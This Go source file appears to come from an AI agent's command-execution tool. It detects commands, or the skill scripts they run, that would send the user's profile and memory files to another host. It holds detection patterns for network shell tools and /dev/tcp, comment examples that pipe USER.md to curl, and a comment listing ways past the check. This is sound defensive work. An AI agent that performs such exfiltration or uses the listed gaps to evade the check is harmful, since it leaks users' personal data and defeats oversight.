package tools

import (
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// remoteURLPattern finds the URLs a command reaches.
var remoteURLPattern = regexp.MustCompile(`(?i)\b(?:https?|ftps?|sftp|wss?)://[^\s'"<>()]+`)

// networkClientPattern finds a program that reaches another host without a
// URL scheme (`curl host/api`, `scp f user@host:`, `> /dev/tcp/h/p`): in
// command position, quoted as in a script's argument list, or bash's socket.
var networkClientPattern = regexp.MustCompile(
	`(?i)(?:(?:^|[;&|(\x60\n]|\$\()\s*(?:(?:sudo|env|exec|nohup|time|xargs)\s+(?:-\S+\s+)*)?` +
		`(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh|telnet|ftp)(?:\.exe)?(?:\s|$)` +
		`|['"](?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh)['"]|/dev/(?:tcp|udp)/)`)

// personalFilePattern finds the person's profile and memory: what the assistant
// knows about them, never a deliverable of a task.
var personalFilePattern = regexp.MustCompile(
	`(?i)(?:^|[\s'"=@/\\(,:])(?:(?:user|soul|memory)\.md\b|(?:memory|sessions)[/\\])`)

// writtenFilePattern finds where a command writes what it fetches: a personal
// file there is written, not sent. `tee` counts only as a pipeline stage, with
// every file it names; anywhere else the word is just an argument.
var writtenFilePattern = regexp.MustCompile(
	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+))\s*\S+|\|\s*tee\b[^|]*`)

// scriptPathPattern finds the script files a command hands to an interpreter.
var scriptPathPattern = regexp.MustCompile(`[^\s'"<>|;&()]+\.(?:py|sh|bash|js|mjs|cjs|ts|rb|pl|php)\b`)

const (
	maxScannedScripts     = 8
	maxScannedScriptBytes = 64 << 10
)

// personalFilesSentTo returns where a command would hand the person's profile
// or memory files, or "". A skill or a file that asks for it is not the person
// asking, and some models follow a skill step by step. A file counts as sent
// only when the same command, or the skill script it runs, reaches another
// host and does not merely write the file.
// shortcut: it reads each command on its own and only the scripts of skills, so code that builds the
// address or the path at run time, a script reached after a cd, or a copy sent by a later command passes;
// upgrade to a network policy for skill scripts then.
func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
	for _, unit := range commandUnits(command) {
		text := unit + t.skillScriptsRun(unit, cwd)
		destination := remoteDestination(text)
		sent := withoutWrittenFiles(remoteURLPattern.ReplaceAllString(text, " "))
		if destination != "" && personalFilePattern.MatchString(sent) {
			return destination
		}
	}
	return ""
}

// inputRedirectPattern finds a file a stage reads (`< USER.md`): it feeds the
// pipeline, so it stays where the stage's own outputs are dropped.
var inputRedirectPattern = regexp.MustCompile(`<\s*[^\s<>|;&]+`)

// withoutWrittenFiles drops the files a command writes, keeping what a
// dropped stage reads: `tee /tmp/x < USER.md | curl -d @- host` sends USER.md.
func withoutWrittenFiles(text string) string {
	return writtenFilePattern.ReplaceAllStringFunc(text, func(written string) string {
		return " " + strings.Join(inputRedirectPattern.FindAllString(written, -1), " ") + " "
	})
}

func remoteDestination(text string) string {
	if raw := remoteURLPattern.FindString(text); raw != "" {
		if parsed, err := url.Parse(raw); err == nil && parsed.Hostname() != "" {
			return parsed.Hostname()
		}
		return raw
	}
	if networkClientPattern.MatchString(text) {
		return "another host"
	}
	return ""
}

// commandUnits splits a command where one command ends and the next begins:
// an unquoted `;`, `&&` or `||`, or a new line the shell does not continue with
// a backslash. A pipeline stays whole, since `cat USER.md | curl -d @- host`
// sends what the first stage reads; so does a new line inside quotes, and a
// heredoc body, which is the input of the command that opens it.
func commandUnits(command string) []string {
	var units []string
	var unit strings.Builder
	runes := []rune(lineContinuation.Replace(command))
	quote := rune(0)
	var heredocs []heredoc
	cut := func() {
		units = append(units, unit.String())
		unit.Reset()
	}
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		switch {
		case quote != 0:
			if r == quote {
				quote = 0
			}
		case r == '\'' || r == '"':
			quote = r
		case r == '<' && i+2 < len(runes) && runes[i+1] == '<' && runes[i+2] != '<':
			if doc, ok := readHeredoc(runes[i+2:]); ok {
				heredocs = append(heredocs, doc)
			}
		case r == '\n':
			unit.WriteRune(r)
			for _, doc := range heredocs {
				i = doc.appendBody(runes, i+1, &unit) - 1
			}
			heredocs = nil
			cut()
			continue
		case r == ';':
			cut()
			continue
		case (r == '&' || r == '|') && i+1 < len(runes) && runes[i+1] == r:
			cut()
			i++
			continue
		}
		unit.WriteRune(r)
	}
	cut()
	return units
}

// heredoc is a `<<WORD` or `<<-WORD` the command opened.
type heredoc struct {
	delimiter string
	stripTabs bool
}

// readHeredoc reads the delimiter that follows `<<`, quoted or bare.
func readHeredoc(rest []rune) (heredoc, bool) {
	doc := heredoc{}
	i := 0
	if i < len(rest) && rest[i] == '-' {
		doc.stripTabs = true
		i++
	}
	for i < len(rest) && (rest[i] == ' ' || rest[i] == '\t') {
		i++
	}
	var word strings.Builder
	for ; i < len(rest) && !strings.ContainsRune(" \t\n;&|<>()", rest[i]); i++ {
		if rest[i] != '\'' && rest[i] != '"' && rest[i] != '\\' {
			word.WriteRune(rest[i])
		}
	}
	doc.delimiter = word.String()
	return doc, doc.delimiter != ""
}

// appendBody writes the heredoc's lines, from start through the delimiter
// line, to unit as they are (no quotes are tracked in data), and returns where
// the next line begins. A body that never closes runs to the end.
func (doc heredoc) appendBody(runes []rune, start int, unit *strings.Builder) int {
	for start < len(runes) {
		end := start
		for end < len(runes) && runes[end] != '\n' {
			end++
		}
		line := string(runes[start:end])
		unit.WriteString(line)
		unit.WriteByte('\n')
		start = end + 1
		if doc.stripTabs {
			line = strings.TrimLeft(line, "\t")
		}
		if line == doc.delimiter {
			break
		}
	}
	return start
}

// lineContinuation joins what the shell runs as one line.
var lineContinuation = strings.NewReplacer("\\\r\n", " ", "\\\n", " ")

// skillScriptsRun is the text of the skill scripts a command runs, so a skill
// script that names the files and the address itself is read like the command.
// Only skills come from someone else: the assistant's own scripts, a cron job
// that saves fetched data to memory among them, are not read.
func (t *ExecTool) skillScriptsRun(command, cwd string) string {
	if t.workingDir == "" {
		return ""
	}
	var text strings.Builder
	for _, name := range scriptPathPattern.FindAllString(command, maxScannedScripts) {
		path := name
		if !filepath.IsAbs(path) {
			path = filepath.Join(cwd, path)
		}
		if !isSkillScript(path, t.workingDir) {
			continue
		}
		if info, err := os.Stat(path); err != nil || !info.Mode().IsRegular() {
			continue
		}
		file, err := os.Open(path)
		if err != nil {
			continue
		}
		data, _ := io.ReadAll(io.LimitReader(file, maxScannedScriptBytes))
		file.Close()
		text.WriteString("\n")
		text.Write(data)
	}
	return text.String()
}

// isSkillScript says whether path, once its links are resolved, is inside the
// workspace and under skills/ or a loop's loops/<slug>/skills/. A skills/ that
// links out of the workspace is not read: the refusal names a host, and one
// from a file the agent cannot read must not leak.
func isSkillScript(path, workspace string) bool {
	resolved, err := filepath.EvalSymlinks(path)
	if err != nil {
		return false
	}
	root, err := filepath.EvalSymlinks(workspace)
	if err != nil {
		return false
	}
	rel, err := filepath.Rel(root, resolved)
	if err != nil || !filepath.IsLocal(rel) {
		return false
	}
	parts := strings.Split(filepath.ToSlash(rel), "/")
	return len(parts) > 1 && parts[0] == "skills" || len(parts) > 3 && parts[0] == "loops" && parts[2] == "skills"
}
